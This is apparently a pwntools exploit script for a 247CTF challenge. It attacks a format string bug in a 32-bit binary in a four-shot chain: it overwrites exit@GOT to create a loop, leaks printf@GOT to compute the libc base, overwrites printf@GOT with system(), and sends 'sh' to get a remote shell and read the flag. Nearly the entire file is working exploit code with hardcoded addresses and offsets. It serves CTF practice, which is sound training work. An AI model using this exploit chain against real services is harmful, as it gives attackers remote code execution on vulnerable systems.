#!/usr/bin/env python3
"""
Less Confused Environment Write - 247CTF PWN

Challenge: "Can you abuse our less confused environment service to obtain a write primitive?"
Remote: tcp://d153c17062e9c8c8.247ctf.com:50304

Vulnerability: Format string vulnerability in a single-shot binary (no loop).
The binary says "Goodbye!" and exits after one input, unlike the looping
"confused environment write" challenge.

Exploit Strategy (4-shot chain):
1. Overwrite exit@GOT (0x804a020) → _start (0x8048440) to create a loop
2. Leak printf@GOT (0x804a010) to compute libc base
3. Overwrite printf@GOT → system()
4. Send "sh" → printf("sh") → system("sh") → shell!
"""
from pwn import *
import time
import re

# === CONFIGURATION ===
BINARY = "./chall"
HOST = 'd153c17062e9c8c8.247ctf.com'
PORT = 50304

context.log_level = 'info'

# Binary addresses (no PIE)
EXIT_GOT     = 0x804a020
PRINTF_GOT   = 0x804a010
START_ADDR   = 0x8048440

# Libc offsets (glibc 2.27 - same as confused_env_write)
PRINTF_OFFSET = 0x50b60
SYSTEM_OFFSET = 0x3cd10

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT, timeout=15)
    elif args.GDB:
        return gdb.debug(BINARY, gdbscript='''
            b *main
            continue
        ''')
    else:
        return process(BINARY)

def build_hn_overwrite(target_addr, value, start_offset=11):
    """Build a format string payload to write a 4-byte value using two %hn writes."""
    lo = value & 0xffff
    hi = (value >> 16) & 0xffff

    addr_lo = p32(target_addr)
    addr_hi = p32(target_addr + 2)
    initial = 8  # 4+4 bytes from two addresses

    if hi <= lo:
        # Write hi first (smaller), then lo
        pad1 = (hi - initial) % 0x10000
        pad2 = (lo - hi) % 0x10000
        fmt = b''
        if pad1 > 0: fmt += f'%{pad1}c'.encode()
        fmt += f'%{start_offset+1}$hn'.encode()
        if pad2 > 0: fmt += f'%{pad2}c'.encode()
        fmt += f'%{start_offset}$hn'.encode()
        payload = addr_lo + addr_hi + fmt
    else:
        # Write lo first (smaller), then hi
        pad1 = (lo - initial) % 0x10000
        pad2 = (hi - lo) % 0x10000
        fmt = b''
        if pad1 > 0: fmt += f'%{pad1}c'.encode()
        fmt += f'%{start_offset}$hn'.encode()
        if pad2 > 0: fmt += f'%{pad2}c'.encode()
        fmt += f'%{start_offset+1}$hn'.encode()
        payload = addr_lo + addr_hi + fmt

    return payload

def exploit():
    io = get_process()
    time.sleep(0.3)
    io.recvuntil(b'again?\n', timeout=5)

    # === SHOT 1: Overwrite exit@GOT → _start to create loop ===
    log.info("Shot 1: Overwriting exit@GOT → _start (creating loop)")
    payload1 = build_hn_overwrite(EXIT_GOT, START_ADDR)
    log.info(f"  Payload: {len(payload1)} bytes")
    io.sendline(payload1)

    # Drain format string output + wait for program restart
    io.recvuntil(b'again?\n', timeout=15)
    log.success("Program looped! Got second iteration")

    # === SHOT 2: Leak printf@GOT to get libc base ===
    log.info("Shot 2: Leaking libc via printf@GOT")
    payload2 = p32(PRINTF_GOT) + b'XXXX%11$s'
    io.sendline(payload2)

    resp = io.recvuntil(b'again?\n', timeout=15)
    idx = resp.find(b'XXXX')
    if idx < 0 or len(resp) < idx + 8:
        log.error("Failed to find leak marker!")
        io.close()
        return

    printf_addr = u32(resp[idx+4:idx+8])
    libc_base = printf_addr - PRINTF_OFFSET
    system_addr = libc_base + SYSTEM_OFFSET

    log.info(f"  printf@libc = {hex(printf_addr)}")
    log.info(f"  libc base   = {hex(libc_base)}")
    log.info(f"  system      = {hex(system_addr)}")

    # Verify libc base is page-aligned
    if libc_base & 0xfff != 0:
        log.warning("libc base not page-aligned! Offsets may be wrong")

    # === SHOT 3: Overwrite printf@GOT → system ===
    log.info("Shot 3: Overwriting printf@GOT → system")
    payload3 = build_hn_overwrite(PRINTF_GOT, system_addr)
    log.info(f"  Payload: {len(payload3)} bytes")

    if len(payload3) > 63:
        log.error(f"Payload too long ({len(payload3)} bytes)!")
        io.close()
        return

    io.sendline(payload3)

    # Drain output and wait for restart
    # After printf@GOT → system, the subsequent printf("!") and printf("Goodbye!")
    # become system("!") and system("Goodbye!") which fail but don't crash.
    # Then exit → _start → main → fgets reads our next input → printf(buf) → system(buf)
    time.sleep(3)
    try:
        io.recv(65536, timeout=5)
    except:
        pass

    # === SHOT 4: Send shell command ===
    log.info("Shot 4: Sending 'sh' for shell")
    io.sendline(b'sh')
    time.sleep(1)

    # Try to interact with shell
    log.info("Trying shell interaction...")
    try:
        io.sendline(b'echo SHELL_OK')
        time.sleep(1)
        out = io.recv(4096, timeout=3)
        log.info(f"Shell test: {out}")

        if b'SHELL_OK' in out:
            log.success("Got shell!")

        # Get flag
        io.sendline(b'cat flag* /flag* 2>/dev/null; ls -la')
        time.sleep(2)
        out = io.recvrepeat(timeout=5)
        log.info(f"Flag output: {out[:500]}")

        if b'247CTF' in out:
            match = re.search(rb'247CTF\{[^}]+\}', out)
            if match:
                log.success(f"FLAG: {match.group(0).decode()}")
                with open('flag.txt', 'w') as f:
                    f.write('247CTF{XXXXXXXXXXXXXXXXXXXX}\n')
                io.close()
                return

        io.interactive()

    except EOFError:
        log.warning("Connection closed - trying alternative approach")
    except Exception as e:
        log.warning(f"Error: {e}")

    io.close()

if __name__ == '__main__':
    exploit()
